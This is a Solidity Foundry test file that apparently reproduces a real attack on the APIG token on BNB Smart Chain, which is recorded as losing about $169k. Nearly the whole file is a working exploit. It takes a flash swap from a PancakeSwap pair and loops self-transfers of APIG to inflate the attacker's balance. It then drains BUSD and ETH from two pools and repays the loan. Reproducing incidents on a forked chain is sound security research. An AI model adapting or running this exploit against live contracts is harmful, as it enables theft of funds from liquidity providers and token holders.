// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : 59.5 ETH and ~72.1k USDT (~$169k)
// Attacker : https://bscscan.com/address/0x73d80500b30a6ca840bfab0234409d98cf588089
// Attack Contract : https://bscscan.com/address/0xfdc6a621861ed2a846ab475c623e13764f6a5ad0
// Attack Tx : https://bscscan.com/tx/0x66dee84591aeeba6e5f31e12fe728f2ddc79a06426036793487a980c3b952947

// @Analysis
// Twitter Guy : https://twitter.com/CertiKAlert/status/1700128158647734745

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract ContractTest is Test {
    IPancakePair aDaDPair = IPancakePair(0xaDaD973f8920bc511d94aade2762284f621F1467);
    IPancakePair EfBfPair = IPancakePair(0xEFBf31B0Ca397D29E9BA3fb37FE3C013EE32871d);
    IPancakePair b920Pair = IPancakePair(0xb920456AeC6E88c68C16c8294688B2b63C81B2Ce);
    IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IBEP20 BUSD = IBEP20(0x55d398326f99059fF775485246999027B3197955);
    IBEP20 BETH = IBEP20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
    IBEP20 APIG = IBEP20(0xDc630Fb4F95FaAeE087E0CE45d5b9c4fc9888888);
    uint256 amount = 500_000_000_000_000_000_000;
    address[] path = new address[](2);

    function setUp() public {
        vm.createSelectFork("bsc", 31_562_012 - 1);
        vm.label(address(aDaDPair), "0xadad_Pair");
        vm.label(address(EfBfPair), "0xefbf_Pair");
        vm.label(address(b920Pair), "0xb920_Pair");
        vm.label(address(router), "PancakeRouter");
        vm.label(address(BUSD), "BSC-USD");
        vm.label(address(BETH), "ETH");
        vm.label(address(APIG), "APIG");
    }

    function testExploit() external {
        uint256 startBUSD = BUSD.balanceOf(address(this));
        // console.log("Before Start: %d USD", startBUSD);
        aDaDPair.swap(amount, 0, address(this), abi.encode(amount));

        uint256 expBUSD = BUSD.balanceOf(address(this)) - startBUSD;
        uint256 intRes_USD = expBUSD / 1 ether;
        uint256 decRes_USD = expBUSD - intRes_USD * 1e18;
        console.log("Attack Exploit: %s.%s USD", intRes_USD, decRes_USD);
        uint256 intRes_ETH = BETH.balanceOf(address(this)) / 1 ether;
        uint256 decRes_ETH = BETH.balanceOf(address(this)) - intRes_ETH * 1e18;
        console.log("Attack Exploit: %s.%s ETH", intRes_ETH, decRes_ETH);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        BUSD.transfer(address(EfBfPair), amount);
        (path[0], path[1]) = (address(BUSD), address(APIG));
        uint256[] memory swapAmounts = router.getAmountsOut(amount, path);
        EfBfPair.swap(0, swapAmounts[1], address(this), "");
        uint256 amount72628 = BUSD.balanceOf(address(EfBfPair)) - 5e19;
        (path[0], path[1]) = (address(APIG), address(BUSD));
        uint256[] memory APIG_BUSD = router.getAmountsIn(amount72628, path);
        uint256 amount59500 = BETH.balanceOf(address(b920Pair)) - 1e17;
        (path[0], path[1]) = (address(APIG), address(BETH));
        uint256[] memory APIG_BETH = router.getAmountsIn(amount59500, path);
        while (true) {
            uint256 transferAmount = APIG.balanceOf(address(this));
            APIG.transfer(address(this), transferAmount);
            if (transferAmount >= 257_947_240_540_223_703_649_846_558_720) {
                break;
            }
        }

        APIG.transfer(address(EfBfPair), APIG_BUSD[0] + APIG_BUSD[0] / 100 * 4);
        EfBfPair.swap(amount72628, 0, address(this), "");
        BUSD.transfer(address(aDaDPair), amount + amount / 100 * 3);
        APIG.transfer(address(b920Pair), APIG.balanceOf(address(this)));
        b920Pair.swap(amount59500, 0, address(this), "");
    }
}
